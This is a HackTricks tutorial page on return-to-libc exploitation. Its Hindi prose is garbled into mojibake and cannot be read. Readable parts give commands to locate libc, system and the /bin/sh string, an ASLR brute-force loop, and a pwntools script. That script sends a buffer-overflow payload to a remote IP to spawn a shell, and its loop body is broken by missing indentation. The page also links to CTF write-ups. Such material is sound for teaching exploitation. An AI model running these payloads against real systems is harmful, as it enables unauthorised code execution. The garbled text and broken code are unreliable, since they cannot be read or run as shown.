# Ret2lib

{% hint style="success" %}
рдПрдбрдмреНрд▓реНрдпреВрдПрд╕ рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг рдПрдбрдмреНрд▓реНрдпреВрдПрд╕ рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (рдПрдЖрд░рдЯреАрдИ)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рдЬреАрд╕реАрдкреА рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг рдЬреАрд╕реАрдкреА рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (рдЬреАрдЖрд░рдЯреАрдИ)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕**](https://github.com/carlospolop/hacktricks) рдФрд░ [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}

## **рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА**

**Ret2Libc** рдХрд╛ рд╕рд╛рд░ рд╣реИ рдХрд┐рд╕реА рднреА рд╡рдВрд▓рд░рдмрд▓ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдлреНрд▓реЛ рдХреЛ рдПрдХ рд╕рд╛рдЭрд╛ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рдлрд╝рдВрдХреНрд╢рди (рдЬреИрд╕реЗ **рд╕рд┐рд╕реНрдЯрдо**, **рдПрдХреНрд╕реАрд╡реА**, **рд╕реНрдЯреНрд░рдХреЛрдкреА**) рдореЗрдВ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдирд╛ рдмрдЬрд╛рдп рдЕрдЯреИрдХрд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрддреНрдд рд╢реИрд▓рдХреЛрдб рдХреЛ рд╕реНрдЯреИрдХ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рд╣реИред рдЕрдЯреИрдХрд░ рдПрдХ рдкреЗрд▓реЛрдб рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рд╕реНрдЯреИрдХ рдкрд░ рд╡рд╛рдкрд╕реА рдкрддрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрдЪреНрдЫрд┐рдд рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдлрд╝рдВрдХреНрд╢рди рдкрд░ рдкрд╣реБрдВрдЪреЗ, рд╕рд╛рде рд╣реА рдХреЙрд▓рд┐рдВрдЧ рдХрдиреНрд╡реЗрдВрд╢рди рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЖрд╡рд╢реНрдпрдХ рддрд░реАрдХреЗ рд╕реЗ рдХрд┐рд╕реА рднреА рдЖрд╡рд╢реНрдпрдХ рддрд░реНрдХреЛрдВ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рд╡реНрдпрд╡рд╕реНрдерд┐рдд рдХрд░рддрд╛ рд╣реИред

### **рдЙрджрд╛рд╣рд░рдг рдХрджрдо (рд╕рд░рд▓реАрдХреГрдд)**

* рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рдВрдХреНрд╢рди (рдЬреИрд╕реЗ рд╕рд┐рд╕реНрдЯрдо) рдФрд░ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб (рдЬреИрд╕реЗ /рдмрд┐рди/рд╢) рдХрд╛ рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рдкрд╣рд▓реЗ рддрд░реНрдХ рдХреЛ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд░рдУрдкреА рд╢реНрд░реГрдВрдЦрд▓рд╛ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ рдЬреЛ рдХрдорд╛рдВрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рдкрд░ рдкрд╣рд▓рд╛ рддрд░реНрдХ рджрд┐рдЦрд╛рддреА рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢рди рдзрд╛рд░рд╛ рдХреЛ рд╕реЗрдЯ рдХрд░рддреА рд╣реИ

## рдкрддреЗ рдЦреЛрдЬрдирд╛

* рдорд╛рди рд▓реЗрдиреЗ рдХреА `libc` рдЬреЛ рд╡рд░реНрддрдорд╛рди рдорд╢реАрди рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИ, рдЙрд╕реЗ рдЖрдк рдпрд╣рд╛рдБ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдореЗрдореЛрд░реА рдореЗрдВ рдХрд╣рд╛рдБ рд▓реЛрдб рд╣реЛрдЧреА:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

рдпрджрд┐ рдЖрдк рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ ASLR libc рдХреЗ рдкрддреЗ рдХреЛ рдмрджрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* рдЬрд╛рдирддреЗ рд╣реБрдП рдХрд┐ рдХреМрди рд╕реА libc рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, `system` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдСрдлрд╕реЗрдЯ рдвреВрдВрдврдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* рдЬрд╛рдирддреЗ рд╣реБрдП рдЬрд┐рд╕ libc рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЙрд╕рд╕реЗ `/bin/sh` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдСрдлрд╕реЗрдЯ рдХреЛ рднреА рдЦреЛрдЬрдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### рдЬреАрдбреАрдмреА-рдкреАрдбрд╛ / рдЬреАрдИрдПрдл рдХрд╛ рдЙрдкрдпреЛрдЧ

рд▓рд┐рдмрд╕реА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рдмрд╛рдж, **system** рдлрд╝рдВрдХреНрд╢рди, **exit** рдлрд╝рдВрдХреНрд╢рди рдФрд░ рд╕реНрдЯреНрд░рд┐рдВрдЧ **`/bin/sh`** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП Peda рдпрд╛ GEF рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рд╕рдВрднрд╡ рд╣реИ:
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps рдХрд╛ рдЙрдкрдпреЛрдЧ

рдпрджрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде рдмрд╛рдд рдХрд░рддреЗ рд╣реИрдВ (рдиреЗрдЯрд╡рд░реНрдХ рд╕рд░реНрд╡рд░) рддреЛ **рдмрдЪреНрдЪреЗ** рдмрдирд╛ рд░рд╣реА рд╣реИ, рддреЛ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдкрдврд╝рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЖрдкрдХреЛ рд░реВрдЯ рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред

рдпрд╣рд╛рдБ рдЖрдк **рд╕рдЯреАрдХ рд░реВрдк рд╕реЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ libc рдХрд╣рд╛рдБ рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рд╣реИ** рдФрд░ **рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдмрдЪреНрдЪреЛрдВ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛рдБ рд▓реЛрдб рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ**ред

![](<../../../.gitbook/assets/image (853).png>)

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрд╣ **0xb75dc000** рдореЗрдВ рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рд╣реИ (рдпрд╣ libc рдХрд╛ рдмреЗрд╕ рдкрддрд╛ рд╣реЛрдЧрд╛)

## рдЕрдЬреНрдЮрд╛рдд libc

рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдирд╣реАрдВ рд╣реЛ рдХрд┐ **рдмрд╛рдЗрдирд░реА рдХрд┐рд╕ libc рдХреЛ рд▓реЛрдб рдХрд░ рд░рд╣рд╛ рд╣реИ** (рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рд╕рд░реНрд╡рд░ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрдкрдХрд╛ рдХреЛрдИ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реИ)ред рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рд╡рд┐рдХрд▓реНрдк рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдХреБрдЫ рдкрддреЗ рдЪреБрд░рд╛рдиреЗ рдФрд░ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреМрди рд╕рд╛ libc** рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

рдФрд░ рдЖрдк рдЗрд╕рдХреЗ рд▓рд┐рдП рдПрдХ pwntools рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 2 рдСрдлрд╕реЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде libc рдХреЛ рдЬрд╛рдиреЗрдВ

рдкреГрд╖реНрда [https://libc.blukat.me/](https://libc.blukat.me/) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдФрд░ libc рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ **рдХреБрдЫ рдкрддреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╕рдВрд╕реНрдХрд░рдг** рдЦреЛрдЬреЗрдВред

## 32 рдмрд┐рдЯ рдореЗрдВ ASLR рдХреЛ рдЙрдордХрд░рдирд╛

рдпреЗ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕рд┐рдВрдЧ рд╣рдорд▓реЗ **рдХреЗрд╡рд▓ 32 рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рд▓рд┐рдП** рдЙрдкрдпреЛрдЧреА рд╣реИрдВред

* рдпрджрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╕реНрдерд╛рдиреАрдп рд╣реИ, рддреЛ рдЖрдк libc рдХреЗ рдмреЗрд╕ рдкрддреЗ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (32 рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* рдЕрдЧрд░ рдЖрдк рдПрдХ рд░рд┐рдореЛрдЯ рд╕рд░реНрд╡рд░ рдкрд░ рд╣рдорд▓рд╛ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдк `libc` рдлрд╝рдВрдХреНрд╢рди `usleep` рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдмрд░реНрдЯ-рдлреЛрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, 10 рдХреЛ рдПрд░реНрдЧреНрдпреВрдореЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд░рддреЗ рд╣реБрдПред рдпрджрд┐ рдХрд┐рд╕реА рд╕рдордп рд╕рд░реНрд╡рд░ **10 рд╕реЗрдХрдВрдб рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рдордп рд▓реЗрддрд╛ рд╣реИ** рддреЛ рдЖрдкрдиреЗ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд▓рд┐рдпрд╛ рд╣реИред

## рд╡рди рдЧреИрдЬреЗрдЯ

`libc` рдореЗрдВ **рдПрдХ** рд╡рд┐рд╢рд┐рд╖реНрдЯ **рдкрддреЗ** рдкрд░ рдЬрд╛рдХрд░ рд╢реИрд▓реА рдЪрд▓рд╛рдПрдВ:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ ASLR рдмрд░реНрдЯ-рдлреЛрд░реНрд╕ рдХреЛрдб рдореЗрдВ рдПрдХреАрдХреГрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рд╡рдВрд▓рд░реЗрдмрд▓ рдмрд╛рдЗрдирд░реА рдПрдХ рд░рд┐рдореЛрдЯ рд╕рд░реНрд╡рд░ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реЗ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib рдЙрджрд╛рд╣рд░рдг

ARM64 рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, ret рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди x30 рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЗ рдкреЙрдЗрдВрдЯрд┐рдВрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕реНрдерд╛рди рдкрд░ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рди рдХрд┐ рд╕реНрдЯреИрдХ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЗ рдкреЙрдЗрдВрдЯрд┐рдВрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕реНрдерд╛рди рдкрд░ред рдЗрд╕рд▓рд┐рдП рдпрд╣ рдереЛрдбрд╝рд╛ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, ARM64 рдореЗрдВ рдПрдХ рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди рд╡рд╣реА рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди рдХрд░рддрд╛ рд╣реИ (рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди рдХреЗ рдмреАрдЪ рдореЗрдВ рдЬрд╛рдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдирдП рдмрдирд╛рдиреЗ рдХрд╛ рд╕рдВрднрд╛рд╡рдирд╛ рдирд╣реАрдВ рд╣реИ)ред

рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (рдпрд╛ puts)

рдЗрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ `printf`/`puts` рдХреЛ рдХреБрдЫ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рддрд░рд╣ рд╕реЗ рдХреЙрд▓ рдХрд░рдХреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `puts` рдХреЗ рдкрддреЗ рдХреЛ GOT рдореЗрдВ рдбрд╛рд▓рдХрд░ `puts` рдХреЗ рдПрдХреНрдпреВрд╢рди рдореЗрдВ рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ рдореЗрдореЛрд░реА рдореЗрдВ `puts` рдХрд╛ рдкрддрд╛ **рд▓реАрдХ рд╣реЛ рдЬрд╛рдПрдЧрд╛**ред

## Ret2printf

рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдПрдХ **Ret2lib рдХреЛ `printf` рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╡рд▓рдирд░реЗрдмрд┐рд▓рд┐рдЯреА рдореЗрдВ рдмрджрд▓рдиреЗ** рдХрд╛ рдЕрднрдпрд╛рд╕ рдХрд░рдирд╛ рд╣реИ `ret2lib` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `printf` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдиреЛрдВ рдХреЗ рд╕рд╛рдеред (рдпрд╣ рдмреЗрдХрд╛рд░ рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╕рдВрднрд╡ рд╣реИ):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрддреЗ рдореЗрдВ рд▓реАрдХ рджреЗрдиреЗ рдХреЗ рд╕рд╛рде, рдПрдХ рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо рд╣реИ рд▓реЗрдХрд┐рди PIE рдирд╣реАрдВ, рдкрд╣рд▓рд╛ рдХрджрдо рд╣реИ рдХреИрдирд╛рд░реА рдХреЗ 0x00 рдмрд╛рдЗрдЯ рддрдХ рдУрд╡рд░рдлреНрд▓реЛ рднрд░рдирд╛ рдФрд░ рдлрд┐рд░ рдкреБрдЯреНрд╕ рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдЗрд╕реЗ рд▓реАрдХ рдХрд░рдирд╛ред рдХреИрдирд╛рд░реА рдХреЗ рд╕рд╛рде рдПрдХ ROP рдЧреИрдЬреЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдкреБрдЯреНрд╕ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП GOT рд╕реЗ рдкреБрдЯреНрд╕ рдХрд╛ рдкрддрд╛ рд▓реАрдХ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдПрдХ ROP рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо рд╣реИ, рдХреИрдирд╛рд░реА рдирд╣реАрдВ, рдореБрдЦреНрдп рд╕реНрдЯреИрдХ рд╕реЗ рдЪрд╛рдЗрд▓реНрдб рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛред рдкреБрдЯреНрд╕ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреБрдЯреНрд╕ рдХреЗ рдкрддреЗ рдХреЛ GOT рд╕реЗ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдлрд┐рд░ рдПрдХ рд╡рди рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 рдмрд┐рдЯ, рдХреЛрдИ рдкрд╛рдИ, рдХреЛрдИ рдХреИрдирд╛рд░реА, рдХреЛрдИ рд░реЗрд▓рд░реЛ, рдПрдирдПрдХреНрд╕ред рд▓реАрдмреАрд╕реА рд╕реЗ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рд╛рдЗрдЯ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ (рд▓рд┐рдмреАрд╕реА) рдФрд░ рдПрдХ рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* рд╕реНрдЯреИрдХ рд╕реЗ рдХреИрдирд╛рд░реА рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░рддрд╛ рд╣реИ (рдпрд╣ GOT рдореЗрдВ рд╣реИ) рдХреЗ рд╕рд╛рде `/bin/sh` рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рдеред
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 рдмрд┐рдЯ, рдХреЛрдИ рд░реЗрд▓рд░реЛ, рдХреЛрдИ рдХреИрдирд╛рд░реА, рдПрдирдПрдХреНрд╕, рдкрд╛рдИ рдирд╣реАрдВред рд╕реНрдЯреИрдХ рд╕реЗ рд▓реАрдмреАрд╕реА рдФрд░ рд╣реАрдк рдХреЗ рдкрддреЛрдВ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмреБрд░рд╛ рдЗрдВрдбреЗрдХреНрд╕рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░реЗрдЯ2рд▓рд┐рдм рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `system('/bin/sh')` (рд╣реАрдк рдкрддрд╛ рдПрдХ рдЬрд╛рдВрдЪ рдХреЛ рдЙрд▓рдЯрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ)ред
